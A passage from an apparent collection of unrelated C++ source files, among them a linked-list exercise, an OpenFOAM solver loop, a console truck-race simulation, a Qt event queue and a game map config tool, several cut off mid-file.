stateInterface;\r\nvoid print(){std::cout<<printNum++<<\" \"<<(GetTickCount()-start)/1000.<<\"|test\"<<\"\\n\";}\r\nvoid print(std::string input){std::cout<<printNum++<<\" \"<<(GetTickCount()-start)/1000.<<\"|\"<<input<<\"\\n\";}\r\nvoid print(int input){std::cout<<printNum++<<\" \"<<(GetTickCount()-start)/1000.<<\"|\"<<input<<\"\\n\";}\r\nvoid print(long long input){std::cout<<printNum++<<\" \"<<(GetTickCount()-start)/1000.<<\"|\"<<input<<\"\\n\";}\r\nvoid print(int input,int in){std::cout<<printNum++<<\" \"<<(GetTickCount()-start)/1000.<<\"|\"<<input<<\" \"<<in<<\"\\n\";}\r\nvoid print(double input){std::cout<<printNum++<<\" \"<<(GetTickCount()-start)/1000.<<\"|\"<<input<<\"\\n\";}\r\nint randomNum(int min, int max) {\r\n\t//return lower + std::rand() % (upper - lower + 1);\r\n    std::random_device rd;  // Obtain a random number from hardware\r\n    std::mt19937 gen(rd()); // Seed the generator\r\n    std::uniform_int_distribution<> distr(min, max); // Define the range\r\n\r\n    return distr(gen); // Generate the number\r\n}\r\nint randomElement(const std::vector<std::string>& vec) {\r\n    return std::rand() % vec.size();\r\n}\r\nstd::string getRandomElement(const std::vector<std::string>& vec) {\r\n    return vec[std::rand() % vec.size()];\r\n}\r\nstruct TreeNode {\r\n    double x;\r\n    double y;\r\n    TreeNode* left;\r\n    TreeNode* right;\r\n\r\n    TreeNode(double x, double y) : x(x), y(y), left(nullptr), right(nullptr) {}\r\n};\r\n\r\n// Recursive function to build the binary tree\r\nTreeNode* buildTree(double x, double y, int level, int n, double x_multiplier) {\r\n    if (level > n) {\r\n        return nullptr;\r\n    }\r\n\r\n    // Create the current node\r\n    TreeNode* node = new TreeNode(x, y);\r\n\r\n    if (level < n) {\r\n        // Calculate x positions for children with the multiplier applied\r\n        double x_offset = x_multiplier / (1 << (n - level)); // 2^(n-level)\r\n        double x_left = x - x_offset;\r\n        double x_right = x + x_offset;\r\n        double y_next = y + 1; // Inverted y coordinate\r\n\r\n        // Recursively create left and right children\r\n        node->left = buildTree(x_left, y_next, level + 1, n, x_multiplier);\r\n        node->right = buildTree(x_right, y_next, level + 1, n, x_multiplier);\r\n    }\r\n\r\n    return node;\r\n}\r\n\r\n// Function to print the binary tree coordinates\r\nvoid printTree(TreeNode* node) {\r\n    if (node == nullptr) {\r\n        return;\r\n    }\r\n\r\n    // Print current node\r\n    std::cout << std::fixed << std::setprecision(2) << \"x: \" << node->x << \", y: \" << node->y << std::endl;\r\n\r\n    // Recursively print left and right children\r\n    printTree(node->left);\r\n    printTree(node->right);\r\n}\r\n\r\n// Function to shift the tree to ensure non-negative x coordinates\r\nvoid shiftTree(TreeNode* node, double& shift_amount) {\r\n    if (node == nullptr) {\r\n        return;\r\n    }\r\n\r\n    // Update the shift_amount based on the current node's x\r\n    if (node->x < shift_amount) {\r\n        shift_amount = node->x;\r\n    }\r\n\r\n ",
    "#include<iostream>\n#include<string>\n#include <fstream>\n#include <sstream> \n\n//\u53cc\u65b9\u5411\u30ea\u30b9\u30c8\ntemplate <typename T>\nclass List\n{\nprivate:\n\n    //\u30ea\u30b9\u30c8\u306e\u5404\u8981\u7d20\n    struct ListElement\n    {\n        T data;\n\n        ListElement* front = nullptr;\n\n        ListElement* back = nullptr;\n    };\n\n    //\u30ea\u30b9\u30c8\u306e\u30a4\u30c6\u30ec\u30fc\u30bf\u30fc(\u7bc4\u56f2for\u3092\u4f7f\u3046\u305f\u3081)\n    class ListIterator\n    {\n    public:\n\n        ListIterator(ListElement* ptr) :element{ptr}\n        {\n\n        }\n\n        T& operator *()\n        {\n            return element->data;\n        }\n\n        void operator ++()\n        {\n            element = element->back;\n        }\n\n        bool operator !=(ListIterator& right)\n        {\n            return element != right.element;\n        }\n    private:\n        ListElement* element;\n    };\n\npublic:\n\n    ListElement* begin_ptr = nullptr;\n    ListElement* end_ptr = nullptr;\n\n    //begin\u306e\u30a4\u30c6\u30ec\u30fc\u30bf\u30fc\u3092\u8fd4\u3059\n    ListIterator begin() const\n    {\n        return ListIterator{ begin_ptr };\n    }\n\n    //end\u306e\u30a4\u30c6\u30ec\u30fc\u30bf\u30fc\u3092\u8fd4\u3059\n    ListIterator end() const\n    {\n        return ListIterator{ nullptr };\n    }\n\n    //\u5f8c\u308d\u306b\u8981\u7d20\u3092\u8ffd\u52a0\u3059\u308b\n    void add(const T& addData)\n    {\n\n        if (begin_ptr == nullptr)\n        {\n            begin_ptr = new ListElement{ addData,nullptr,nullptr };\n            end_ptr = begin_ptr;\n        }\n        else \n        {\n            end_ptr->back = new ListElement{ addData,end_ptr,nullptr };\n            end_ptr->back->front = end_ptr;\n            end_ptr = end_ptr->back;\n        }\n    }\n};\n\nint main() \n{\n    //\u30c6\u30b9\u30c8\u30b3\u30fc\u30c9\n    List<std::pair<int,std::string>> list;\n\n    std::ifstream file;\n    std::string line;\n\n    file.open(\"Scores.txt\", std::ios::in);\n\n    //\u4e00\u884c\u305a\u3064\u8aad\u307f\u8fbc\u3080\n    while (std::getline(file, line))\n    {\n        std::pair<int, std::string>data;\n\n        //\u30bf\u30d6\u3067\u533a\u5207\u308a\u3001\u30ea\u30b9\u30c8\u306b\u8ffd\u52a0\u3059\u308b\u3002\n        std::string temp;\n        std::stringstream ss{ line };\n        std::getline(ss, temp, '\\t');\n        data.first = atoi(temp.c_str());\n        std::getline(ss, temp, '\\t');\n        data.second = temp;\n\n        list.add(data);\n    }\n\n    for (const auto& data : list)\n    {\n        std::cout << data.first <<\"\\t\" << data.second << std::endl;\n    }\n}\n",
    "#include \"fvCFD.H\"\n#include \"solidcloud.h\"\n\nint main(int argc, char *argv[])\n{\n    #include \"setRootCase.H\"\n    #include \"createTime.H\"\n    #include \"createMesh.H\"\n    #include \"createFields.h\"\n    #include \"initContinuityErrs.H\"\n\n    std::string dictfile;\n\n    // if start-time > 0, read from start-time-folder for solidDict, otherwise read from case root\n    if(runTime.time().value() > 0)\n    {\n        if(!Foam::Pstream::parRun())\n            dictfile = \"./\" + mesh.time().timeName() + \"/solidDict\";\n        else\n            dictfile = \"./processor0/\" + mesh.time().timeName() + \"/solidDict\";\n    }\n    else\n    {\n        dictfile = \"solidDict\";\n    }\n\n    sdfibm::SolidCloud solidcloud(dictfile, U, runTime.value());\n    solidcloud.saveState();  // write the initial condition\n\n    while (runTime.loop())\n    {\n        Foam::Info << \"Time = \" << runTime.timeName() << Foam::endl;\n\n        #include \"CourantNo.H\"\n        Foam::dimensionedScalar dt = runTime.deltaT();\n\n        if(solidcloud.isOnFluid())\n        {\n            Foam::fvVectorMatrix UEqn(\n                fvm::ddt(U)\n              + 1.5*fvc::div(phi, U) - 0.5*fvc::div(phi.oldTime(), U.oldTime())\n              ==0.5*fvm::laplacian(nu, U) + 0.5*fvc::laplacian(nu, U));\n            UEqn.solve();\n\n            phi = linearInterpolate(U) & mesh.Sf();\n            Foam::fvScalarMatrix pEqn(fvm::laplacian(p) == fvc::div(phi)/dt - fvc::div(Fs));\n            pEqn.solve();\n\n            U   = U   - dt*fvc::grad(p);\n            phi = phi - dt*fvc::snGrad(p)*mesh.magSf();\n\n            Foam::fvScalarMatrix TEqn(\n                fvm::ddt(T)\n              + fvm::div(phi, T)\n              ==fvm::laplacian(alpha, T));\n            TEqn.solve();\n        }\n\n        solidcloud.interact(runTime.value(), dt.value());\n\n        if(solidcloud.isOnFluid())\n        {\n            U = U - Fs*dt;\n            phi = phi - dt*(linearInterpolate(Fs) & mesh.Sf());\n\n            U.correctBoundaryConditions();\n            adjustPhi(phi, U, p);\n            \n            T = (1.0 - As)*T + Ts;\n            T.correctBoundaryConditions();\n\n            #include \"continuityErrs.H\"\n        }\n\n        solidcloud.evolve(runTime.value(), dt.value());\n        solidcloud.saveState();\n\n        if(solidcloud.isOnFluid())\n        {\n            solidcloud.fixInternal(dt.value());\n        }\n\n        if(runTime.outputTime())\n        {\n            runTime.write();\n\n            if(Foam::Pstream::master())\n            {\n                std::string file_name;\n                if(Foam::Pstream::parRun())\n                    file_name = \"./processor0/\" + runTime.timeName() + \"/solidDict\";\n                else\n                    file_name = \"./\" + runTime.timeName() + \"/solidDict\";\n                solidcloud.saveRestart(file_name);\n            }\n        }\n    }\n\n    Foam::Info << \"DONE\\n\" << endl;\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <ctime>\r\n#include \"cores.h\"\r\n#include \"pacote.h\"\r\n#include \"rede.h\"\r\nusing namespace std;\r\n\r\n//Prot\u00f3tipos\r\nvoid Desenha(int, char);\r\nvoid WhiteSpace(int);\r\n\r\nunsigned int rede;\r\n\r\nint main()\r\n{\r\n\t\r\n\tint posA, posB, velA, velB;\t\t\t\t\t\t\t\t\t\t\t\t//Declara\u00e7\u00e3o de vari\u00e1veis\r\n\tchar cor, corA, corB;\t\t\t\t\t\t\t\t\t\t\t\t\t//Declara\u00e7\u00e3o de vari\u00e1veis\r\n\tbool oleoA, oleoB;\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Declara\u00e7\u00e3o de vari\u00e1veis\r\n\tdouble VelMedA, VelMedB, pos;\t\t\t\t\t\t\t\t\t\t\t//Declara\u00e7\u00e3o de vari\u00e1veis\r\n\t\r\n\tsrand(unsigned(time(NULL)));\t\t\t\t\t\t\t\t\t\t\t//Gerador de sementes para rand\r\n\t\r\n// Inicializa dados:\r\n\tposA = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// - Posi\u00e7\u00e3o\r\n\tposB = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// - Posi\u00e7\u00e3o\r\n\tvelA = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// - Velocidade\r\n\tvelB = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// - Velocidade\r\n\tcorA = azul;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// - Cores\r\n\tcorB = vermelho;\t\t\t\t\t\t\t\t\t\t\t\t\t\t// - Cores\r\n\toleoA = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// - Estado da pista\r\n\toleoB = 0;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// - Estado da pista\r\n\r\n// --------------------\r\n\t\r\n\t\r\n\t\r\n\tint passo = 0;\r\n\tdo\r\n\t{\r\n\t\tsystem(\"cls\");\t\t\t\t\t\t\t\t\t\t\t\t\t\t// Limpa tela\r\n\r\n\t\tAjustaCor(preto, branco);\t\t\t\t\t\t\t\t\t\t\t//Chamada da fun\u00e7\u00e3o para alterar a cor do texto\r\n\t\tcout << \"Passo:\" << limpar << \" \" << passo << endl;\t\t\t\t\t//Mostra o valor atual do passo na tela\r\n\r\n\t\tpos = posA;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Inicializa\u00e7\u00e3o da vari\u00e1vel com dados em rela\u00e7\u00e3o ao caminh\u00e3o 1\r\n\t\tcor = corA;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Inicializa\u00e7\u00e3o da vari\u00e1vel com dados em rela\u00e7\u00e3o ao caminh\u00e3o 1\r\n\t\tDesenha(pos, cor);\t\t\t\t\t\t\t\t\t\t\t\t\t//Desenha caminh\u00e3o 1\r\n\t\t\r\n\r\n\t\tvelA = rand() % 10 + 1;\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza velocidade\r\n\t\t\t\t\t\t\r\n\t\toleoA = rand() % 2;\t\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza estado da pista\r\n\t\t\r\n\t\t// Transmite, recebe e processa dados\r\n\r\n\t\tint net = 0;\r\n\t\tResetarCor();\r\n\t\tcout << \"transmitindo dados...\" << endl;\r\n\t\ttransmitir(passo, cor, posA, velA, oleoA);\t\t\t\t\t\t\t//Chama a fun\u00e7\u00e3o transmitir, que acionar\u00e1 o empacotamento de dados e enviar\u00e1 para a rede\r\n\t\tResetarCor();\r\n\t\tcout << \"recebendo dados...\" << endl;\r\n\t\treceber();\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Chama a fun\u00e7\u00e3o receber, para ler os dados da rede\r\n\t\tResetarCor();\r\n\t\tcout << \"processando dados...\" << endl;\r\n\t\tposA = processar(rede);\t\t\t\t\t\t\t\t\t\t\t\t//Guarda a posi\u00e7\u00e3o de do caminh\u00e3o 2 e chama a fun\u00e7\u00e3o processar\r\n\t\t\r\n\t\tAjustaCor(preto, branco);\t\t\t\t\t\t\t\t\t\t\t//Chamada da fun\u00e7\u00e3o para alterar a cor do texto\r\n\t\tcout << \"\\n\\nPasso:\" << limpar << \" \" << passo << endl;\t\t\t\t//Mostra o valor atual do passo na tela\r\n\r\n\t\tpos = posB;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza\u00e7\u00e3o do valor da vari\u00e1vel em rela\u00e7\u00e3o ao caminh\u00e3o 2\r\n\t\tcor = corB;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza\u00e7\u00e3o do valor da vari\u00e1vel em rela\u00e7\u00e3o ao caminh\u00e3o 2\r\n\t\tDesenha(pos, cor);\t\t\t\t\t\t\t\t\t\t\t\t\t//Desenha caminh\u00e3o 2\r\n\t\t\r\n\t\tvelB = rand() % 10 + 1;\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza velocidade\r\n\t\t\r\n\t\toleoB = rand() % 2;\t\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza estado da pista\r\n\r\n\r\n\t\t// Transmite, recebe e processa dados\r\n\t\tResetarCor();\r\n\t\tcout << \"transmitindo dados...\" << endl;\r\n\t\ttransmitir(passo, cor, posB, velB, oleoB);\t\t\t\t\t\t\t//Chama a fun\u00e7\u00e3o transmitir, que acionar\u00e1 o empacotamento de dados e enviar\u00e1 para a rede\r\n\t\tResetarCor();\r\n\t\tcout << \"recebendo dados...\" << endl;\r\n\t\treceber();\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Chama a fun\u00e7\u00e3o receber, para ler os dados da rede\r\n\t\tResetarCor();\r\n\t\tcout << \"processando dados...\" << endl;\r\n\t\tposB = processar(rede);\t\t\t\t\t\t\t\t\t\t\t\t//Guarda a posi\u00e7\u00e3o de do caminh\u00e3o 2 e chama a fun\u00e7\u00e3o processar\r\n\t\t\t\t\r\n\r\n\t\tsystem(\"pause\");\t\t\t\t\t\t\t\t\t\t\t\t\t//Aguarda pressionamento de tecla\r\n\t\t\t\r\n\r\n\t\t\tpasso = passo + 1;\r\n\t} while (posA <= 100 && posB <= 100);\r\n\t\r\n\tsystem(\"cls\");\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Limpa tela\r\n\r\n\tpos = posA;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza\u00e7\u00e3o do valor da vari\u00e1vel em rela\u00e7\u00e3o ao caminh\u00e3o 1\r\n\tcor = corA;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza\u00e7\u00e3o do valor da vari\u00e1vel em rela\u00e7\u00e3o ao caminh\u00e3o 1\r\n\tDesenha(pos, cor);\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Desenha o caminh\u00e3o 1\r\n\t\r\n\tVelMedA = pos / passo;\t\t\t\t\t\t\t\t\t\t\t\t\t//Atribui um valor para a vari\u00e1vel\r\n\r\n\tpos = posB;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza\u00e7\u00e3o do valor da vari\u00e1vel em rela\u00e7\u00e3o ao caminh\u00e3o 2\r\n\tcor = corB;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Atualiza\u00e7\u00e3o do valor da vari\u00e1vel em rela\u00e7\u00e3o ao caminh\u00e3o 2\r\n\tDesenha(pos, cor);\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Desenha o caminh\u00e3o 2\r\n\t\r\n\tVelMedB = pos / passo;\t\t\t\t\t\t\t\t\t\t\t\t\t//Atribui um valor para a vari\u00e1vel\r\n\t\r\n\t\r\n\tAjustaCor(preto, branco);\t\t\t\t\t\t\t\t\t\t\t\t//Chamada da fun\u00e7\u00e3o para alterar a cor do texto\r\n\tcout << \"Passo:\" << limpar << \" \" << passo <<  \"\\n\" << endl;\t\t\t//Mostra o valor atual do passo na tela\r\n\r\n\tAjustaCor(preto, corA);\r\n\tcout << left; cout.width(4); cout << \"pos:\";\t\t\t\t\t\t\t//Mostra a posi\u00e7\u00e3o atual do caminh\u00e3o\r\n\tAjustaCor(corA, preto); \r\n\tcout << \" \";\r\n\tcout.width(8); cout << posA ;\r\n\tAjustaCor(preto, corA);\r\n\tcout << right; cout.width(6); cout << \"vel med:\";\t\t\t\t\t\t//Mostra a velocidade m\u00e9dia do caminh\u00e3o\r\n\tAjustaCor(corA, preto);\r\n\tcout << fixed;\r\n\tcout.precision(2);\t\t\t\t\t\t\t\t\t\t\t\t\t\t//Trava a exibi\u00e7\u00e3o dos resultados com 2 casa ap\u00f3s a virgula\r\n\tcout << \" \" << VelMedA  << endl;\t\t\t\t\t\t\t\t\t\t//Exibe resultados\r\n\r\n\tAjustaCor(preto, corB);\r\n\tcout << left; cout.width(4); cout << \"pos:\";\t\t\t\t\t\t\t//Mostra a posi\u00e7\u00e3o atual do caminh\u00e3o\r\n\tAjustaCor(corB, preto);\r\n\tcout << \" \";\r\n\tcout.width(8); cout << posB;\r\n\tAjustaCo",
    "/*\n * File: geventqueue.cpp\n * ---------------------\n *\n * @author Marty Stepp\n * @version 2019/01/08\n * - bug fix in waitForClick function (was never returning!)\n * @version 2018/08/23\n * - renamed to geventqueue.cpp\n * @version 2018/07/03\n * - initial version\n */\n\n#include <QEvent>\n#include \"geventqueue.h\"\n#include \"gtypes.h\"\n#include \"gthread.h\"\n\nGEventQueue* GEventQueue::_instance = nullptr;\n\nGEventQueue::GEventQueue()\n        : _eventMask(0) {\n    // empty\n}\n\nGThunk GEventQueue::dequeue() {\n    _functionQueueMutex.lockForWrite();\n    GThunk thunk = _functionQueue.dequeue();\n    _functionQueueMutex.unlock();\n    return thunk;\n}\n\nvoid GEventQueue::enqueueEvent(const GEvent& event) {\n    if (isAcceptingEvent(event.getEventClass())) {\n        _eventQueueMutex.lockForWrite();\n        _eventQueue.enqueue(event);\n        _eventQueueMutex.unlock();\n    }\n}\n\nint GEventQueue::getEventMask() const {\n    return _eventMask;\n}\n\nGEvent GEventQueue::getNextEvent(int mask) {\n    setEventMask(mask);\n\n    // check if any events have arrived\n    _eventQueueMutex.lockForRead();\n    bool empty = _eventQueue.isEmpty();\n    _eventQueueMutex.unlock();\n\n    if (!empty) {\n        // grab the event and return it\n        _eventQueueMutex.lockForWrite();\n        while (!_eventQueue.isEmpty()) {\n            GEvent event = _eventQueue.dequeue();\n            if (isAcceptingEvent(event)) {\n                _eventQueueMutex.unlock();\n                return event;\n            }\n        }\n        _eventQueueMutex.unlock();\n    }\n\n    GEvent bogusEvent;\n    return bogusEvent;\n}\n\nGEventQueue* GEventQueue::instance() {\n    if (!_instance) {\n        _instance = new GEventQueue();\n    }\n    return _instance;\n}\n\nbool GEventQueue::isAcceptingEvent(const GEvent& event) const {\n    return isAcceptingEvent(event.getEventClass());\n}\n\nbool GEventQueue::isAcceptingEvent(int eventClass) const {\n    return (_eventMask & eventClass) != 0;\n}\n\nbool GEventQueue::isEmpty() const {\n    return _functionQueue.isEmpty();\n}\n\nGThunk GEventQueue::peek() {\n    _functionQueueMutex.lockForRead();\n    GThunk thunk = _functionQueue.peek();\n    _functionQueueMutex.unlock();\n    return thunk;\n}\n\nvoid GEventQueue::runOnQtGuiThreadAsync(GThunk thunk) {\n    _functionQueueMutex.lockForWrite();\n    _functionQueue.enqueue(thunk);\n    _functionQueueMutex.unlock();\n    emit eventReady();\n}\n\nvoid GEventQueue::runOnQtGuiThreadSync(GThunk thunk) {\n    _functionQueueMutex.lockForWrite();\n    _functionQueue.enqueue(thunk);\n    _functionQueueMutex.unlock();\n    emit eventReady();\n\n    // TODO: \"empty\" is not quite right condition\n    while (true) {\n        _functionQueueMutex.lockForRead();\n        bool empty = _functionQueue.isEmpty();\n        _functionQueueMutex.unlock();\n        if (empty) {\n            break;\n        } else {\n            GThread::getCurrentThread()->sleep(1);\n        }\n    }\n}\n\nvoid GEventQueue::setEventMask(int mask) {\n    _eventMask = mask;\n}\n\nGEvent GEventQueue::waitForEvent(int mask) {\n    setEventMask(mask);\n    while (true) {\n        // check if any events have arrived\n        _eventQueueMutex.lockForRead();\n        bool empty = _eventQueue.isEmpty();\n        _eventQueueMutex.unlock();\n\n        if (!empty) {\n            // grab the event and return it\n            _eventQueueMutex.lockForWrite();\n            while (!_eventQueue.isEmpty()) {\n                GEvent event = _eventQueue.dequeue();\n                if (isAcceptingEvent(event)) {\n                    _eventQueueMutex.unlock();\n                    return event;\n                }\n            }\n            _eventQueueMutex.unlock();\n        }\n\n        GThread::getCurrentThread()->sleep(1);\n    }\n}\n\nGEvent getNextEvent(int mask) {\n    return GEventQueue::instance()->getNextEvent(mask);\n}\n\nGMouseEvent waitForClick() {\n    while (true) {\n        GMouseEvent event = GEventQueue::instance()->waitForEvent(MOUSE_EVENT);\n        if (event.getEventType() == MOUSE_CLICKED) {\n            return event;\n        }\n    }\n}\n\nGEvent waitForEvent(int mask) {\n    return GEventQueue::instance()->waitForEvent(mask);\n}\n\n\n",
    "#include <iostream>\r\n#include <bits/stdc++.h>\r\n\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cin >> n;\r\n    vector<vector<int>> edge(n);\r\n   for(int i=0;i<n;i++){\r\n        int follower,following,timee;\r\n        cin >> follower >> following >> timee;\r\n        edge[i].push_back(follower);\r\n        edge[i].push_back(following);\r\n        edge[i].push_back(timee);\r\n   }\r\n   int a,b;\r\n   cin >> a >> b;\r\n   vector<pair<int,int>> p1,p2;\r\n   int ans = INT_MAX;\r\n   for(int i=0;i<n;i++){\r\n       if(edge[i][0] == a && edge[i][1] == b){\r\n           ans = edge[i][2];\r\n       }\r\n       if(edge[i][0] == a){\r\n           p1.push_back({edge[i][1],edge[i][2]});\r\n       }\r\n       if(edge[i][1] == b){\r\n           p2.push_back({edge[i][0],edge[i][2]});\r\n       }\r\n   }\r\n   for(int i=0;i<p1.size();i++){\r\n       for(int j=0;j<p2.size();j++){\r\n           if(p1[i].first == p2[j].first){\r\n               ans = min(ans,p1[i].second + p2[j].second);\r\n           }\r\n       }\r\n   }\r\n   cout << ans;\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"driver.h\"\r\n#include <iostream>\r\n\r\nstd::string format_output(std::vector<int> initial, int idx) {\r\n    /*\r\n     * Format the output given the vector with the initial values and an index\r\n    */\r\n\r\n    std::string output;\r\n\r\n    output.append(\"Dissect \");\r\n    switch (initial[idx]) {\r\n    case 1:\r\n        output.append(\"Triangle \");\r\n        break;\r\n    case 2:\r\n        output.append(\"Circle \");\r\n        break;\r\n    case 3:\r\n        output.append(\"Square \");\r\n        break;\r\n    default:\r\n        break;\r\n    }\r\n    output.append(\"From \");\r\n    switch (idx) {\r\n    case 0:\r\n    case 1:\r\n        output.append(\"Left.\\n\");\r\n        break;\r\n    case 2:\r\n    case 3:\r\n        output.append(\"Center.\\n\");\r\n        break;\r\n    case 4:\r\n    case 5:\r\n        output.append(\"Right.\\n\");\r\n        break;\r\n    }\r\n    return output;\r\n}\r\n\r\ndissections::dissections() {\r\n    for (int i = 0; i < 6; i++) {\r\n        selected[i] = 0;\r\n    }\r\n    this->challengeMode = 0;\r\n}\r\ndissections::~dissections() {}\r\n\r\nstd::string dissections::find_swaps(std::vector<int> initial, std::vector<int> comparison) {\r\n    std::string output;\r\n    int tmp1;\r\n    int start;\r\n    int count = 0;\r\n\r\n\r\n    for (int k = 0; k < 6; k++) {\r\n        std::cout << comparison[k] << \" \";\r\n    }\r\n    std::cout << std::endl;\r\n    for (int k = 0; k < 6; k++) {\r\n        std::cout << initial[k] << \" \";\r\n    }\r\n    std::cout << std::endl;\r\n    std::cout << std::endl;\r\n    if (initial[0] == comparison[0]\r\n        && initial[1] == comparison[1]\r\n        && initial[2] == comparison[2]\r\n        && initial[3] == comparison[3]\r\n        && initial[4] == comparison[4]\r\n        && initial[5] == comparison[5]) {\r\n\r\n        output.append(\"Solved.\");\r\n    }\r\n    while ((initial[0] != comparison[0]\r\n            && initial[1] != comparison[1]\r\n            && initial[2] != comparison[2]\r\n            && initial[3] != comparison[3]\r\n            && initial[4] != comparison[4]\r\n            && initial[5] != comparison[5])\r\n            || count <= 15) {\r\n        for (int i = 0; i < 6; i++) {\r\n            if (initial[i] != comparison[i]) {\r\n\r\n                for (int j = 0; j < 6; j++) {\r\n\r\n                    if (initial[i] == comparison[j] && initial[j] == comparison[i] && i != j && initial[i] != initial[j]) {\r\n\r\n                        output.append(format_output(initial, i));\r\n                        output.append(format_output(initial, j));\r\n                        output.append(\"\\n\");\r\n\r\n                        tmp1 = initial[i];\r\n                        initial[i] = initial[j];\r\n                        initial[j] = tmp1;\r\n\r\n                        for (int k = 0; k < 6; k++) {\r\n                            std::cout << initial[k] << \" \";\r\n                        }\r\n                        std::cout << std::endl;\r\n\r\n                        break;\r\n                    } else if (initial[i] == comparison[j] && i != j && initial[i] != initial[j]) {\r\n                        output.append(format_output(initial, i));\r\n                        output.append(format_output(initial, j));\r\n                        output.append(\"\\n\");\r\n\r\n                        tmp1 = initial[i];\r\n                        initial[i] = initial[j];\r\n                        initial[j] = tmp1;\r\n\r\n                        for (int k = 0; k < 6; k++) {\r\n                            std::cout << initial[k] << \" \";\r\n                        }\r\n                        std::cout << std::endl;\r\n\r\n                        break;\r\n\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        count++;\r\n    }\r\n    return output;\r\n}\r\n\r\nvoid dissections::write_val(int idx, int value) {\r\n    /*\r\n     * 0 : undefined\r\n     * 1 : triangle\r\n     * 2 : circle\r\n     * 3 : square\r\n     * 4 : sphere\r\n     * 5 : cube\r\n     * 6 : pyramid\r\n     * 7 : cylinder\r\n     * 8 : prism\r\n     * 9 : cone\r\n    */\r\n    this->selected[idx] = value;\r\n}\r\n\r\nint dissections::get_val(int idx) {\r\n    return this->selected[idx];\r\n}\r\n\r\nvoid dissections::set_challengeMode(bool value) {\r\n    this->challengeMode = value;\r\n}\r\n\r\nstd::string dissections::dissection() {\r\n    int shape_3d[6];\r\n    std::vector<int> initial_values;\r\n    for (int i = 0; i < 6; i++) {\r\n        shape_3d[i] = 0;\r\n        initial_values.push_back(0);\r\n    }\r\n\r\n    //sphere cylinder cone\r\n    for (int i = 0; i < 3; i++) {\r\n        switch(this->selected[3+i]) {\r\n        case 4:\r\n            shape_3d[0+(i*2)] = 2;\r\n            shape_3d[1+(i*2)] = 2;\r\n            break;\r\n        case 5:\r\n            shape_3d[0+(i*2)] = 3;\r\n            shape_3d[1+(i*2)] = 3;\r\n            break;\r\n        case 6:\r\n            shape_3d[0+(i*2)] = 1;\r\n            shape_3d[1+(i*2)] = 1;\r\n            break;\r\n        case 7:\r\n            shape_3d[0+(i*2)] = 2;\r\n            shape_3d[1+(i*2)] = 3;\r\n            break;\r\n        case 8:\r\n            shape_3d[0+(i*2)] = 1;\r\n            shape_3d[1+(i*2)] = 3;\r\n            break;\r\n        case 9:\r\n            shape_3d[0+(i*2)] = 2;\r\n            shape_3d[1+(i*2)] = 1",
    "#include <base/system.h>\n#include <base/tl/array.h>\n#include <engine/shared/datafile.h>\n#include <engine/shared/linereader.h>\n#include <engine/storage.h>\n#include <game/mapitems.h>\n\nvoid Process(IStorage *pStorage, const char *pMapName, const char *pConfigName)\n{\n\tIOHANDLE File = pStorage->OpenFile(pConfigName, IOFLAG_READ, IStorage::TYPE_ABSOLUTE);\n\tarray<char *> aLines;\n\tchar *pSettings = NULL;\n\tif(!File)\n\t{\n\t\tdbg_msg(\"config_store\", \"config '%s' not found\", pConfigName);\n\t\treturn;\n\t}\n\n\tCLineReader LineReader;\n\tLineReader.Init(File);\n\n\tchar *pLine;\n\tint TotalLength = 0;\n\twhile((pLine = LineReader.Get()))\n\t{\n\t\tint Length = str_length(pLine) + 1;\n\t\tchar *pCopy = (char *)malloc(Length);\n\t\tmem_copy(pCopy, pLine, Length);\n\t\taLines.add(pCopy);\n\t\tTotalLength += Length;\n\t}\n\tio_close(File);\n\n\tpSettings = (char *)malloc(maximum(1, TotalLength));\n\tint Offset = 0;\n\tfor(int i = 0; i < aLines.size(); i++)\n\t{\n\t\tint Length = str_length(aLines[i]) + 1;\n\t\tmem_copy(pSettings + Offset, aLines[i], Length);\n\t\tOffset += Length;\n\t\tfree(aLines[i]);\n\t}\n\n\tCDataFileReader Reader;\n\tReader.Open(pStorage, pMapName, IStorage::TYPE_ABSOLUTE);\n\n\tCDataFileWriter Writer;\n\tWriter.Init();\n\n\tint SettingsIndex = Reader.NumData();\n\tbool FoundInfo = false;\n\tfor(int i = 0; i < Reader.NumItems(); i++)\n\t{\n\t\tint TypeID;\n\t\tint ItemID;\n\t\tint *pData = (int *)Reader.GetItem(i, &TypeID, &ItemID);\n\t\tint Size = Reader.GetItemSize(i);\n\t\tCMapItemInfoSettings MapInfo;\n\t\tif(TypeID == MAPITEMTYPE_INFO && ItemID == 0)\n\t\t{\n\t\t\tFoundInfo = true;\n\t\t\tCMapItemInfoSettings *pInfo = (CMapItemInfoSettings *)pData;\n\t\t\tif(Size >= (int)sizeof(CMapItemInfoSettings))\n\t\t\t{\n\t\t\t\tMapInfo = *pInfo;\n\t\t\t\tpData = (int *)&MapInfo;\n\t\t\t\tSize = sizeof(MapInfo);\n\t\t\t\tif(pInfo->m_Settings > -1)\n\t\t\t\t{\n\t\t\t\t\tSettingsIndex = 